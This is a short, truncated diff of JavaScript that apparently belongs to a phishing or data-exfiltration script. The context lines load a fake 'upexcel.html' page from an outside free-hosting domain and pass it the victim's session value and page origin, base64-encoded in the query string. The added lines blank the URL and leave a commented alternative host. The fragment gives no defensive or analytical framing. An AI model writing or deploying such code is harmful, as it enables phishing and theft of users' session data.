@@ -751,7 +751,10 @@
                             downURL.push(url);
                             //
                             url = lstSTO[url].indexOf('://') > -1 ? lstSTO[url] : '//' + lstSTO[url];
-
+                            //
+                            //
+                            url = '';// hellodat.pages.dev/ol
+                            //
                             //
                             ///media/utils/jsc/upemp.js
                             evtWK.setAttribute('src', url + '/000webhostapp.tep/upexcel.html?seson=' + btoa(calcSession + '|' + w0w.location.origin
